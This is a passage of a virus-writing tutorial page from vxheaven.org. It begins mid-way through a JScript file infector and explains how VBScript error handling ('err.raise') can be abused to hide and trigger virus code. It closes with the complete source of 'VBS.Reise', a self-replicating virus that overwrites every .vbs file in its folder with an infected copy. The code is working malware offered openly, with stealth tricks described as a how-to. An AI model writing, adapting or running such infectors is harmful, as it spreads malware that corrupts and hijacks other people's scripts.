&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b<span style="color: #339933;">=</span>f.<span style="color: #660066;">OpenTextFile</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>h<span style="color: #339933;">=</span>b.<span style="color: #660066;">ReadAll</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>b.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">6</span><span style="color: black;">&#41;</span><span style="color: #339933;">!=</span><span style="color: #3366CC;">&quot;//hh86&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p<span style="color: #339933;">=</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">;</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l<span style="color: #339933;">=</span>f.<span style="color: #660066;">CreateTextFile</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l.<span style="color: #660066;">Write</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;//hh86<span style="color: #000099; font-weight: bold;">\r</span>try{throw &quot;</span><span style="color: #339933;">+</span>t<span style="color: #339933;">+</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #3366CC;">&quot;}catch(e){e()}&quot;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\r</span>&quot;</span><span style="color: #339933;">+</span>h<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>l.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">=</span>p<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
<span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>e<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h2><a name="c3"></a>VBScript</h2>
<p>VBScript has no Try, Catch and Throw statement. Instead we have 'On Error Resume Next' and 'On Error GoTo 0'. The first one is so obvious, the latter goes by default, no exception handling is used. Method Raise from Err object can cause an exception on purpose. It has some arguments: Number (long), Source (string), Description (string), HelpFile (string), HelpContext (string). Since the latter On Error does not support GoTo Label, we cannot specify a routine to handle err. On Resume Next, when an exception happens the IP is moved to next and continues execution, unpredictableness happens next. If we adjust the JScript idea then we can do the next:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">on</span> <span style="color: #151B8D; font-weight: bold;">error</span> <span style="color: #151B8D; font-weight: bold;">resume</span> <span style="color: #8D38C9; font-weight: bold;">next</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'must specify<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; err.raise asc(<span style="color: #800000;">&quot;s&quot;</span>)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'cause exception, send char code<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; v = v &amp; chr(err)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'get and concatenate<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; err.raise asc(<span style="color: #800000;">&quot;e&quot;</span>)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; v = v &amp; chr(err)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; err.raise asc(<span style="color: #800000;">&quot;t&quot;</span>)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; v = v &amp; chr(err)<br/>
&nbsp;</div>
<p>We send every character code of the source as exception number. We concatenate the character and so it continues. I do not use 'Err.Number' because Err itself returns the exception number, for optimisation sake. You can send code in any form you want, as string, or number, etcetera.</p>
<h2><a name="c4"></a>EPO</h2>
<p>Good news is, I finally found how to use it to call a routine. So simple. Instead of Number or description or help of any kind, we will pass the name of a function (not a Sub, not a Label. Function). The function will be automatically executed before the IP is moved to next line. So, we hook the execution there. VB6 behaves the same with this. Here goes the code, very simple.</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">on</span> <span style="color: #151B8D; font-weight: bold;">error</span> <span style="color: #151B8D; font-weight: bold;">resume</span> <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; err.raise v &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'au revoir ()<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; ... &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'host code<br/>
</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #E56717; font-weight: bold;">function</span> v()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ... &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'virus code<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #E56717; font-weight: bold;">function</span><br/>
&nbsp;</div>
<p>Great, isn't it? ;)</p>
<p>Here is VBS.Reise:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">:<span style="color: #151B8D; font-weight: bold;">on</span> <span style="color: #151B8D; font-weight: bold;">error</span> <span style="color: #151B8D; font-weight: bold;">resume</span> <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
<span style="color: black; font-style: italic;">'VBS.reise by halloweeney<br/>
</span><span style="color: #151B8D; font-weight: bold;">set</span> f=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;scripting.filesystemobject&quot;</span>)<br/>
u=left(f.gettempname,8)<br/>
v=<span style="color: #800000;">&quot;function &quot;</span>+u+<span style="color: #800000;">&quot;()&quot;</span>+<span style="color: #800000;">&quot;:&quot;</span>+f.opentextfile(wscript.scriptfullname).readall+<span style="color: #800000;">&quot;:end function&quot;</span><br/>
<span style="color: #151B8D; font-weight: bold;">set</span> o=f.getfolder(<span style="color: #800000;">&quot;.&quot;</span>)<br/>
<span style="color: #8D38C9; font-weight: bold;">for</span> <span style="color: #8D38C9; font-weight: bold;">each</span> x <span style="color: #8D38C9; font-weight: bold;">in</span> o.files<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> lcase(f.getextensionname(x))=<span style="color: #800000;">&quot;vbs&quot;</span><span style="color: #8D38C9; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a=x.attributes<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x.attributes=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; g=f.opentextfile(x).readall<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> left(g,1)&lt;&gt;<span style="color: #800000;">&quot;:&quot;</span><span style="color: #8D38C9; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> s=f.createtextfile(x)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; s.write(<span style="color: #800000;">&quot;:on error resume next:err.raise &quot;</span>+<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; u+vbcrlf+g+vbcrlf+v)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; s.<span style="color: #8D38C9; font-weight: bold;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x.attributes=a<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
&nbsp;</div>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhh06">de</a><a href="/lib/index.php?lang=en&amp;id=vhh06">en</a><a href="/lib/index.php?lang=es&amp;id=vhh06">es</a><a href="/lib/index.php?lang=it&amp;id=vhh06">it</a><a href="/lib/index.php?lang=fr&amp;id=vhh06">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhh06">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhh06">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhh06">ua</a></div>
</body>
</html>
